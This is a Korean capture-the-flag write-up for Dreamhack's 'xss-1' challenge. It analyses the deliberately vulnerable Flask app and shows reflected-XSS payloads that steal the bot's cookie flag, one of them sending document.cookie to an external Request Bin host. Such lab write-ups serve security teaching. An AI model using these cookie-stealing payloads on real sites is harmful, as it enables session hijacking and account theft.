# [Dreamhack Wargame] xss-1
### [🚩xss-1](https://dreamhack.io/wargame/challenges/28/)
  <img width="1068" alt="xss-1_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/674dfc3a-875e-4f3a-aeb2-f8e19fe781ce">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" # param의 값을 가져와 /vuln 엔드포인트에 접속하는 URL를 생성함
    return read_url(url, cookie) # 생성된 url과 쿠키를 인자로 주어 read_url 함수를 호출함



# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html") # 인덱스 페이지(index.html)를 화면에 출력함



# vuln 페이지 (이용자가 전달한 값을 화면에 그대로 출력함)
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 전달한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면에 출력함



# flag 페이지: 전달된 URL에 임의 이용자가 접속하게끔 함
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html") # 이용자에게 URL을 입력받는 페이지(flag.html)를 화면에 출력함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param") # 이용자가 전달한 param 인자를 가져옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # param 파라미터에 "flag"과 FLAG를 포함해 check_xss 함수를 호출함
            return '<script>alert("wrong??");history.go(-1);</script>' # check_xss 결과 false가 반환될 경우 "wrong??" 알림창을 출력

        return '<script>alert("good");history.go(-1);</script>' # check_xss 결과 true가 반환될 경우 "good" 알림창을 출력



memo_text = ""

# memo 페에지: 이용자가 메모를 남길 수 있으며, 작성한 메모를 출력함
@app.route("/memo")
def memo():
    global memo_text # memo_text 변수를 전역변수로 참조함
    text = request.args.get("memo", "") # 이용자가 /memo?= 뒤에 입력한 memo 값을 가져옴
    memo_text += text + "\n" # 이용자가 전송한 memo 입력값을 memo_text에 추가함
    return render_template("memo.html", memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력함



app.run(host="0.0.0.0", port=8000)
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 코드
* 이용자의 입력값을 페이지로 출력하는 vuln 페이지와 memo 페이지의 차이점
	- memo 페이지는 ```render_template``` 함수를 사용해 memo_html를 출력
		+ ```render_template``` 함수: 전달된 탬플릿 변수를 기록할 때 HTML 엔티티 코드로 변환해 저장함 → XSS가 발생하지 않음
	- vuln 페이지는 이용자가 입력한 값을 별다른 처리 없이 ```return```문을 통해 그대로 출력함 → XSS가 발생함
		+ vuln 페이지의 ```param``` 값으로 임의 이용자의 쿠키를 탈취할 수 있는 코드를 입력하여 공격을 수행함 (**Reflected XSS 공격**에 해당)

<br/><br/>

### 익스플로잇
* 공격에 사용할 수 있는 속성
	| 속성 | 설명 |
  |-------|-----------------|
	| location.href | 전체 URL를 반환하거나, URL을 업데이트할 수 있는 속성 |
	| document.cookie | 해당 페이지에서 사용하는 쿠키를 읽고, 쓰는 속성 |

<br/>

#### 방법 1: memo 페이지 이용
1. flag 엔드포인트에서 ```<script>location.href=“/memo?memo=“ + document.cookie;</script>```를 입력하고 [제출] 버튼을 클릭함
2. “good” 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음

<br/>

#### 방법 2: 외부 웹 서버 이용
1. 외부에서 접근 가능한 웹 서버를 준비함
	- Dreamhack 페이지에서 제공하는 [드림핵툴즈 서비스](https://tools.dreamhack.games/)의 Request Bin 기능을 이용함
		+ Request Bin 항목에서 랜덤한 URL이 생성되는 것을 확인하고 이를 복사해둠
2. flag 엔드포인트에서 ```<script>location.href=“http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</script>```를 입력하고 [제출] 버튼을 클릭함
3. “good” 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음 
